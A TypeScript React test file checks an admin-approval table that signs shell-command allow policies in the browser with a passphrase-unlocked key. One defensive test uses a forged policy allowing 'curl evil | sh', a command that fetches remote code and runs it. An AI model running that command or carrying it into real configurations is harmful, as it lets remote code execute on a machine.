import { applyPolicy, encryptAdminKey, generateSigningKeyPair, keyId, signPolicy as coreSignPolicy, type SignedPolicy } from '@wadeck-app/machine-core';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { adminKeyHolder } from '../lib/adminKeyHolder.js';
import { AllowRequestsTable, type PendingRequestRow } from './AllowRequestsTable.js';

// The Allow button of the Requests page, driven like a user: click, read the confirmation, type the passphrase, confirm. The app-core shell is a stub on
// globalThis (the contract of @wadeck-app/app-core-sdk/shell); the module backend is a recording fake, so the tests read every byte that leaves the page.

const PASSPHRASE = 'correct horse battery staple 7391';
const NOW = Math.floor(Date.now() / 1000);
const SELF = '22222222-2222-4222-8222-222222222222';
const PEER = '11111111-1111-4111-8111-111111111111';

const admin = generateSigningKeyPair();
const ADMIN_KEY_ID = keyId(admin.publicKey);
const keyFile = JSON.stringify(encryptAdminKey(admin, PASSPHRASE));

const ROWS: PendingRequestRow[] = [
  { peerText: 'thinkcentre', peer: PEER, shell: 'sh', command: 'df -h', countText: '2 times', firstSeenText: '3 h ago', lastSeenText: '5 min ago', nextCommand: 'machine admin allow desktop --shell sh -- "df -h"', nextWhere: '' },
  { peerText: 'thinkcentre', peer: PEER, shell: 'sh', command: 'ls', countText: '1 time', firstSeenText: '1 min ago', lastSeenText: '1 min ago', nextCommand: 'machine admin allow desktop --shell sh -- ls', nextWhere: '' },
];
const ALLOW = { available: true, machine: { uuid: SELF, name: 'desktop' }, note: '' };

const context = (over: Record<string, unknown> = {}) => ({ ok: true, target: { uuid: SELF, name: 'desktop' }, toSelf: true, policyMode: 'admin', adminKeyId: ADMIN_KEY_ID, adminPublicKey: admin.publicKey, current: null, source: 'installed on this machine', delivery: 'install', ...over });

interface Call { url: string; body: unknown; headers: Record<string, string> | undefined }
let calls: Call[];
let elevate: ReturnType<typeof vi.fn>;
let answers: { context: unknown; post: unknown };

beforeEach(() => {
  calls = [];
  answers = { context: context(), post: { ok: true, target: { uuid: SELF, name: 'desktop' }, version: 1, delivery: 'installed' } };
  elevate = vi.fn(async () => undefined);
  const fetcher = async (url: string, _params?: Record<string, string>, body?: unknown, headers?: Record<string, string>) => {
    calls.push({ url, body, headers });
    if (url === `GET /api/modules/machine/allow/${SELF}`) {
      if (answers.context instanceof Error) throw answers.context;
      return answers.context;
    }
    if (url === 'GET /api/modules/machine/admin-key') return { file: keyFile };
    if (url === 'POST /api/modules/machine/allow') {
      if (answers.post instanceof Error) throw answers.post;
      return answers.post;
    }
    throw new Error(`unexpected call ${url}`);
  };
  Object.defineProperty(globalThis, '__APP_CORE_SHELL__', { value: { elevate, fetcher }, configurable: true, writable: true });
});
afterEach(() => {
  Reflect.deleteProperty(globalThis, '__APP_CORE_SHELL__');
  window.localStorage.clear();
  window.sessionStorage.clear();
});

const rowOf = (command: string) => within(screen.getByRole('table')).getByText(command).closest('tr') as HTMLElement;

describe('the table', () => {
  it('lists the waiting requests, with an Allow button on each row', () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    expect(screen.getAllByRole('button', { name: /^Allow/ })).toHaveLength(2);
    expect(within(rowOf('df -h')).getByText('thinkcentre')).toBeInTheDocument();
    expect(within(rowOf('df -h')).getByText('2 times')).toBeInTheDocument();
    expect(within(rowOf('ls')).getByRole('button', { name: 'Allow ls' })).toBeInTheDocument();
  });

  it('is the standard DataTable: every cell of a row has the same padding above and below, so the button sits on the middle of a two-line row', () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    const row = rowOf('df -h');
    expect(row.className).not.toContain('align-top');
    const cells = Array.from(row.querySelectorAll('td'));
    expect(cells.length).toBeGreaterThan(0);
    for (const cell of cells) {
      expect(cell.className).toContain('py-1.5');
      expect(cell.className).not.toMatch(/\bp[tb]-/);
    }
  });

  it('where Allow is not available, no button: the note says why and what to do instead, and the CLI command stays visible', () => {
    render(<AllowRequestsTable rows={ROWS} allow={{ ...ALLOW, available: false, note: 'Only the admin machine can allow a command: run the command shown in each row there.' }} />);
    expect(screen.queryByRole('button', { name: /^Allow/ })).toBeNull();
    expect(screen.getByText(/Only the admin machine can allow/)).toBeInTheDocument();
    expect(screen.getByText('machine admin allow desktop --shell sh -- ls')).toBeInTheDocument();
  });

  it('shows the empty message when nothing waits', () => {
    render(<AllowRequestsTable rows={[]} allow={ALLOW} emptyMessage="No request is waiting for approval" />);
    expect(screen.getByText('No request is waiting for approval')).toBeInTheDocument();
  });
});

describe('the confirmation', () => {
  it('names the machine, the shell and the EXACT command, says it widens rights to every trusted peer, and focuses Cancel', async () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow df -h' }));
    const dialog = await screen.findByRole('dialog');
    expect(await within(dialog).findByLabelText('Admin passphrase')).toHaveAttribute('type', 'password');
    expect(dialog).toHaveAttribute('aria-modal', 'true');
    // The machine row (the name is also in the title and the warning, in the machine font).
    expect(within(dialog).getByText('Machine').nextElementSibling).toHaveTextContent('desktop');
    expect(within(dialog).getByText('sh')).toBeInTheDocument();
    expect(within(dialog).getByText('df -h')).toBeInTheDocument();
    expect(dialog).toHaveTextContent(/widens what peers may run/i);
    expect(dialog).toHaveTextContent(/every trusted peer/i);
    expect(dialog).toHaveTextContent(/version 0 -> 1/);
    expect(within(dialog).getByRole('button', { name: 'Cancel' })).toHaveFocus();
    // The PIN is asked first, before any secret is requested; the module header goes with every call.
    expect(elevate).toHaveBeenCalledTimes(1);
    expect(calls.map((c) => c.url)).toEqual([`GET /api/modules/machine/allow/${SELF}`, 'GET /api/modules/machine/admin-key']);
    expect(calls[0]?.headers).toEqual({ 'x-machine-module': '1' });
  });

  it('Cancel and Escape close it: nothing is signed (the key file is read once per opening, only for its hint)', async () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await screen.findByLabelText('Admin passphrase');
    await userEvent.click(screen.getByRole('button', { name: 'Cancel' }));
    expect(screen.queryByRole('dialog')).toBeNull();
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await screen.findByLabelText('Admin passphrase');
    await userEvent.keyboard('{Escape}');
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(calls.some((c) => c.url.startsWith('POST'))).toBe(false);
  });

  it('a PIN that is cancelled is said in the dialog and nothing else is asked', async () => {
    elevate.mockRejectedValueOnce(new Error('Sensitive action cancelled: PIN not entered'));
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('PIN not entered');
    expect(screen.queryByLabelText('Admin passphrase')).toBeNull();
    expect(calls).toEqual([]);
  });

  it('a context the backend refuses (mode local, no admin token ...) is shown with its words, and no passphrase is asked', async () => {
    answers.context = new Error('"desktop" manages its own allow list (policy mode local): run `machine policy allow -- <command>` on that machine');
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('machine policy allow');
    expect(screen.queryByLabelText('Admin passphrase')).toBeNull();
  });

  it('a command that is already allowed says so and asks no passphrase', async () => {
    const current: SignedPolicy = coreSignPolicy({ v: 1, target: SELF, version: 1, baseVersion: 0, adminKeyId: ADMIN_KEY_ID, issuedAt: NOW - 5, notBefore: NOW - 5, notAfter: NOW + 3600, defaults: [{ shell: 'sh', command: 'ls' }], peers: {} }, admin.privateKeyPkcs8);
    answers.context = context({ current });
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByText(/already allowed/i)).toBeInTheDocument();
    expect(screen.queryByLabelText('Admin passphrase')).toBeNull();
  });

  it('refuses to proceed from a base the pinned admin key did not sign, before any passphrase', async () => {
    const forger = generateSigningKeyPair();
    answers.context = context({ current: coreSignPolicy({ v: 1, target: SELF, version: 4, baseVersion: 3, adminKeyId: ADMIN_KEY_ID, issuedAt: NOW - 5, notBefore: NOW - 5, notAfter: NOW + 3600, defaults: [{ shell: 'sh', command: 'curl evil | sh' }], peers: {} }, forger.privateKeyPkcs8) });
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByRole('alert')).toHaveTextContent(/not signed by the admin key pinned on this machine/);
    expect(screen.queryByLabelText('Admin passphrase')).toBeNull();
  });
});

describe('signing in the page', () => {
  it('the passphrase unlocks the key IN THE PAGE; only the signed policy is posted; machine-core accepts it; the row goes away; the page refreshes its data', async () => {
    const onRefresh = vi.fn(async () => undefined);
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} onRefresh={onRefresh} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow df -h' }));
    const input = await screen.findByLabelText('Admin passphrase');
    await userEvent.type(input, PASSPHRASE);
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));

    await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 20_000 });
    const post = calls.find((c) => c.url === 'POST /api/modules/machine/allow');
    expect(post).toBeDefined();
    const body = post?.body as { policy: SignedPolicy };
    expect(Object.keys(body)).toEqual(['policy']);
    // The daemon's own check (hard rule 4) accepts what the page signed.
    expect(applyPolicy({ version: 0, highestSeen: 0 }, body.policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: Math.floor(Date.now() / 1000) + 5, targetUuid: SELF }).ok).toBe(true);
    expect(body.policy.body.defaults).toEqual([{ shell: 'sh', command: 'df -h' }]);

    // Nothing secret left the page, and nothing secret stayed in it.
    expect(JSON.stringify(calls)).not.toContain(PASSPHRASE);
    expect(document.body.innerHTML).not.toContain(PASSPHRASE);
    expect(JSON.stringify({ ...window.localStorage })).not.toContain(PASSPHRASE);
    expect(JSON.stringify({ ...window.sessionStorage })).not.toContain(PASSPHRASE);
    expect(window.location.href).not.toContain(PASSPHRASE);

    // The row is gone, the other one stays, and the success is said with what happened.
    expect(screen.queryByText('df -h')).toBeNull();
    expect(screen.getByText('ls')).toBeInTheDocument();
    expect(await screen.findByRole('status')).toHaveTextContent(/policy version 1. Installed on desktop/i);
    expect(onRefresh).toHaveBeenCalledWith('requests');
  }, 120_000);

  it('a wrong passphrase: the reason is shown, the field is emptied, nothing is posted, the dialog stays for another try', async () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    const input = await screen.findByLabelText('Admin passphrase');
    await userEvent.type(input, 'definitely not the passphrase 123');
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    const alert = await screen.findByRole('alert', {}, { timeout: 20_000 });
    expect(alert).toHaveTextContent('wrong passphrase or damaged key file');
    expect(alert.textContent).not.toContain('definitely not the passphrase 123');
    expect(screen.getByLabelText('Admin passphrase')).toHaveValue('');
    expect(screen.getByRole('dialog')).toBeInTheDocument();
    expect(calls.some((c) => c.url.startsWith('POST'))).toBe(false);
  }, 120_000);

  it('an empty passphrase is refused in the dialog, without unlocking or posting anything', async () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await screen.findByLabelText('Admin passphrase');
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('Enter the admin passphrase');
    expect(calls.filter((c) => c.url.includes('admin-key'))).toHaveLength(1);
    expect(calls.some((c) => c.url.startsWith('POST'))).toBe(false);
  });

  it('a refusal of the daemon (the policy moved since: stale base) is shown with its own words, the row stays, the dialog stays', async () => {
    answers.post = new Error('the policy of "desktop" is at version 1 (installed on this machine), and this one was edited from version 0: reload the page and allow it again. Nothing was stored or sent');
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await userEvent.type(await screen.findByLabelText('Admin passphrase'), PASSPHRASE);
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    expect(await screen.findByRole('alert', {}, { timeout: 20_000 })).toHaveTextContent(/reload the page and allow it again/);
    expect(screen.getByRole('dialog')).toBeInTheDocument();
    expect(rowOf('ls')).toBeInTheDocument();
  }, 120_000);

  it('for another machine the document is posted too (the inbox delivery)', async () => {
    // The document is sealed to the target (decision 78): the backend sends the identity key of the target in the context.
    answers.context = context({ target: { uuid: SELF, name: 'desktop', identityPublicKey: generateSigningKeyPair().publicKey }, toSelf: false, delivery: 'inbox' });
    answers.post = { ok: true, target: { uuid: SELF, name: 'desktop' }, version: 1, delivery: 'inbox', fallback: { code: 'unreachable', cause: 'connect timed out' }, deliveryText: { tone: 'warning', text: 'desktop is not reachable directly: stored in the relay inbox, it installs it when it comes back (next poll within 60 s, or 5 s while it holds a request). Cause: connect timed out' } };
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await userEvent.type(await screen.findByLabelText('Admin passphrase'), PASSPHRASE);
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 20_000 });
    const body = calls.find((c) => c.url.startsWith('POST'))?.body as { policy: unknown; document: unknown };
    expect(Object.keys(body).sort()).toEqual(['document', 'policy']);
    const status = await screen.findByRole('status');
    expect(status).toHaveTextContent(/desktop is not reachable directly: stored in the relay inbox.*Cause: connect timed out/);
    // The relay inbox is the warning colour, and nothing promises "within about a minute" any more.
    expect(status).toHaveClass('bg-warning-bg');
    expect(status).not.toHaveTextContent(/within about a minute/);
  }, 120_000);

  it('a policy delivered directly is said in the success colour, with the outcome and the time', async () => {
    answers.context = context({ target: { uuid: SELF, name: 'desktop', identityPublicKey: generateSigningKeyPair().publicKey }, toSelf: false, delivery: 'inbox' });
    answers.post = { ok: true, target: { uuid: SELF, name: 'desktop' }, version: 1, delivery: 'direct', direct: { outcome: 'installed', ms: 412 }, deliveryText: { tone: 'success', text: 'Delivered directly to desktop (installed, 0.4 s)' } };
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await userEvent.type(await screen.findByLabelText('Admin passphrase'), PASSPHRASE);
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 20_000 });
    const status = await screen.findByRole('status');
    expect(status).toHaveTextContent('Delivered directly to desktop (installed, 0.4 s)');
    expect(status).toHaveClass('bg-success-bg');
  }, 120_000);
});

describe('the admin key kept in the page (decision 92)', () => {
  it('the passphrase is typed ONCE: the second Allow signs with one click, no passphrase field, the summary still names what is signed; nothing is written to the browser storage', async () => {
    const setItem = vi.spyOn(Storage.prototype, 'setItem');
    const cookie = vi.spyOn(document, 'cookie', 'set');
    const open = vi.fn();
    vi.stubGlobal('indexedDB', { open });
    try {
      render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
      await userEvent.click(screen.getByRole('button', { name: 'Allow df -h' }));
      await userEvent.type(await screen.findByLabelText('Admin passphrase'), PASSPHRASE);
      expect(screen.getByLabelText('Keep unlocked for')).toHaveValue('5');
      await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
      await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 20_000 });
      expect(screen.queryByText('df -h')).toBeNull();

      // Second Allow: the dialog has no field, shows the exact command, and ONE click signs.
      await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
      const dialog = await screen.findByRole('dialog');
      await within(dialog).findByText(/Admin key unlocked, locks in/);
      expect(within(dialog).queryByLabelText('Admin passphrase')).toBeNull();
      expect(within(dialog).getByText('ls')).toBeInTheDocument();
      expect(within(dialog).getAllByText('desktop').length).toBeGreaterThan(0);
      await userEvent.click(within(dialog).getByRole('button', { name: 'Allow and sign' }));
      await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 5000 });
      const posts = calls.filter((c) => c.url === 'POST /api/modules/machine/allow').map((c) => (c.body as { policy: SignedPolicy }).policy);
      expect(posts).toHaveLength(2);
      for (const policy of posts) {
        expect(applyPolicy({ version: 0, highestSeen: 0 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: Math.floor(Date.now() / 1000) + 5, targetUuid: SELF }).ok).toBe(true);
      }
      expect(posts[1]?.body.defaults).toEqual([{ shell: 'sh', command: 'ls' }]);
      expect(JSON.stringify(calls)).not.toContain(PASSPHRASE);

      // Nothing about the key or the choice reached any browser storage.
      expect(setItem).not.toHaveBeenCalled();
      expect(cookie).not.toHaveBeenCalled();
      expect(open).not.toHaveBeenCalled();
      expect(window.localStorage.length).toBe(0);
      expect(window.sessionStorage.length).toBe(0);
    } finally {
      vi.unstubAllGlobals();
      setItem.mockRestore();
      cookie.mockRestore();
    }
  }, 120_000);

  it('"Ask every time" is the old behaviour: the second Allow asks the passphrase again', async () => {
    adminKeyHolder.setKeep('ask');
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow df -h' }));
    await userEvent.type(await screen.findByLabelText('Admin passphrase'), PASSPHRASE);
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 20_000 });
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByLabelText('Admin passphrase')).toBeInTheDocument();
    expect(adminKeyHolder.current()).toBeNull();
  }, 120_000);

  it('a key that locked itself between the dialog and the click says so and shows the passphrase field again', async () => {
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow df -h' }));
    await userEvent.type(await screen.findByLabelText('Admin passphrase'), PASSPHRASE);
    await userEvent.click(screen.getByRole('button', { name: 'Allow and sign' }));
    await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull(), { timeout: 20_000 });
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    await screen.findByText(/Admin key unlocked/);
    // Lock now from the dialog: the field is back, nothing is posted.
    await userEvent.click(screen.getByRole('button', { name: 'Lock now' }));
    expect(screen.getByLabelText('Admin passphrase')).toBeInTheDocument();
    expect(calls.filter((c) => c.url === 'POST /api/modules/machine/allow')).toHaveLength(1);
  }, 120_000);
});

describe('outside the app-core shell', () => {
  it('says the shell is missing instead of falling back to a plain fetch', async () => {
    Reflect.deleteProperty(globalThis, '__APP_CORE_SHELL__');
    render(<AllowRequestsTable rows={ROWS} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByRole('alert')).toHaveTextContent(/the app-core shell does not provide elevate\(\)/);
  });
});

describe('a notice row whose command is already allowed (decision 100)', () => {
  const REPORTER = SELF;
  const NOTICE_ID = 'cccc3333-0000-4000-8000-000000000000';
  const NOTICE_ROW: PendingRequestRow = { ...ROWS[1] as PendingRequestRow, note: 'reported by desktop at 15:20; not verified live', notice: { machine: REPORTER, id: NOTICE_ID } };
  const allowedPolicy = () => coreSignPolicy({ v: 1, target: SELF, version: 1, baseVersion: 0, adminKeyId: ADMIN_KEY_ID, issuedAt: NOW - 5, notBefore: NOW - 5, notAfter: NOW + 3600, defaults: [{ shell: 'sh', command: 'ls' }], peers: {} }, admin.privateKeyPkcs8);
  const dismisses = () => calls.filter((c) => c.url === 'POST /api/modules/machine/dismiss-notice');
  let dismissFails: string | undefined;
  beforeEach(() => {
    dismissFails = undefined;
    const base = (globalThis as unknown as { __APP_CORE_SHELL__: { elevate: unknown; fetcher: (...a: any[]) => Promise<unknown> } }).__APP_CORE_SHELL__;
    const fetcher = async (url: string, params?: Record<string, string>, body?: unknown, headers?: Record<string, string>) => {
      if (url === 'POST /api/modules/machine/dismiss-notice') {
        calls.push({ url, body, headers });
        if (dismissFails !== undefined) throw new Error(dismissFails);
        return { ok: true, removed: 1 };
      }
      return base.fetcher(url, params, body, headers);
    };
    Object.defineProperty(globalThis, '__APP_CORE_SHELL__', { value: { elevate, fetcher }, configurable: true, writable: true });
  });

  it('removes the row at once (the same dismiss as the Dismiss button) and says the notice was removed, not that a refresh will catch up', async () => {
    answers.context = context({ current: allowedPolicy() });
    const onRefresh = vi.fn(async () => undefined);
    render(<AllowRequestsTable rows={[NOTICE_ROW]} allow={ALLOW} onRefresh={onRefresh} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    const dialog = await screen.findByRole('dialog');
    expect(await within(dialog).findByText(/already allowed/i)).toBeInTheDocument();
    expect(dialog).toHaveTextContent(/request notice was removed from the list/i);
    expect(dialog).not.toHaveTextContent(/catches up/i);
    expect(dismisses()).toEqual([{ url: 'POST /api/modules/machine/dismiss-notice', body: { machine: REPORTER, id: NOTICE_ID }, headers: expect.anything() }]);
    expect(screen.queryByLabelText('Admin passphrase')).toBeNull();
    expect(onRefresh).toHaveBeenCalledWith('requests');
    await userEvent.click(within(dialog).getByRole('button', { name: 'Close' }));
    expect(screen.queryByRole('table')).toBeNull();
  });

  it('when the notice cannot be removed it says so and names the way out (Dismiss on the row), the row stays', async () => {
    answers.context = context({ current: allowedPolicy() });
    dismissFails = 'the daemon is not reachable';
    render(<AllowRequestsTable rows={[NOTICE_ROW]} allow={ALLOW} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    const dialog = await screen.findByRole('dialog');
    expect(await within(dialog).findByText(/could not be removed.*the daemon is not reachable.*Dismiss/is)).toBeInTheDocument();
    await userEvent.click(within(dialog).getByRole('button', { name: 'Close' }));
    expect(within(screen.getByRole('table')).getByText('ls')).toBeInTheDocument();
  });

  it('a row of this machine (no notice) is not dismissed: it only asks the page to refresh', async () => {
    answers.context = context({ current: allowedPolicy() });
    const onRefresh = vi.fn(async () => undefined);
    render(<AllowRequestsTable rows={[ROWS[1] as PendingRequestRow]} allow={ALLOW} onRefresh={onRefresh} />);
    await userEvent.click(screen.getByRole('button', { name: 'Allow ls' }));
    expect(await screen.findByText(/already allowed/i)).toBeInTheDocument();
    expect(dismisses()).toEqual([]);
    expect(onRefresh).toHaveBeenCalledWith('requests');
  });
});
